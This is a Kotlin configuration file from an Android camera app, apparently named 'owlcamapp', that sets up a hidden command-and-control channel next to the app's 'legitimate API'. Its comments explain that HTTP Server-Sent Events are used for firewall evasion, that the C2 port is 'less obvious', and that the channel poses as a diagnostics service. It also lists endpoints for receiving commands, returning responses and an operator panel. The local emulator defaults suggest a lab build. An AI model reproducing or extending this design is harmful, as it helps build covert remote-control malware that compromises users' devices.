package com.example.owlcamapp.util

/**
 * API and C2 endpoints configuration.
 *
 * The API server ("host:port") is configurable at runtime from the Login screen
 * and persisted by SessionViewModel. All host-dependent URLs below are computed
 * getters that read [serverBase], so changing the server takes effect app-wide.
 * The C2 endpoint reuses the same host with the fixed C2 port.
 *
 * HTTP/SSE ARCHITECTURE:
 * The C2 system operates over HTTP with Server-Sent Events (SSE) instead of
 * native TCP connections. This allows:
 * - Firewall evasion (standard HTTP traffic)
 * - Automatic NAT traversal (works on 4G/5G and corporate networks)
 * - Persistent connections without non-standard ports
 *
 * C2 connection flow:
 * 1. Validate token at /api/v2/diag/validate
 * 2. Establish SSE connection to C2_SSE_ENDPOINT
 * 3. Listen for 'cmd' events from the server
 * 4. Send responses via POST to C2_RESPONSE_ENDPOINT
 */
object ApiConfig {
    // Defaults (Android emulator: 10.0.2.2 points to the host running Docker).
    const val DEFAULT_HOST = "10.0.2.2"
    const val DEFAULT_API_PORT = "5000"

    // C2 server port (less obvious). Same host as the API, different port.
    const val C2_PORT = 4999

    // Runtime server as "host:port". Set from the Login screen via SessionViewModel.
    @Volatile
    var serverBase: String = "$DEFAULT_HOST:$DEFAULT_API_PORT"

    val host: String get() = serverBase.substringBefore(":")
    val apiPort: String get() = serverBase.substringAfter(":", DEFAULT_API_PORT)

    // Base URL of the legitimate API
    val BASE_URL: String get() = "http://$serverBase"

    // C2 server URL (HTTP/SSE) - derived from the configured host, fixed port
    val C2_SERVER_URL: String get() = "http://$host:$C2_PORT"

    // C2 host for legacy code compatibility (DiagSysService.kt)
    val C2_HOST: String get() = host

    // Headers for device identification in C2
    const val HEADER_DEVICE_ID = "X-Device-ID"
    const val HEADER_DIAG_TOKEN = "X-Diag-Token"
    const val HEADER_DEVICE_MODEL = "X-Device-Model"

    // Legitimate API endpoints
    const val ENDPOINT_SUPPORT = "/api/support/submit"
    const val ENDPOINT_DIAG_VALIDATE = "/api/v2/diag/validate"
    const val ENDPOINT_DIAG_METRICS = "/api/v2/metrics/diagnostic"

    // C2 endpoints (HTTP/SSE)
    val C2_SSE_ENDPOINT: String get() = "$C2_SERVER_URL/stream"
    val C2_RESPONSE_ENDPOINT: String get() = "$C2_SERVER_URL/response"
    val C2_METRICS_ENDPOINT: String get() = "$C2_SERVER_URL/metrics"
    val C2_PANEL_URL: String get() = "$C2_SERVER_URL/panel"

    const val DIAG_VERSION = "2.4.1-SSE"
}
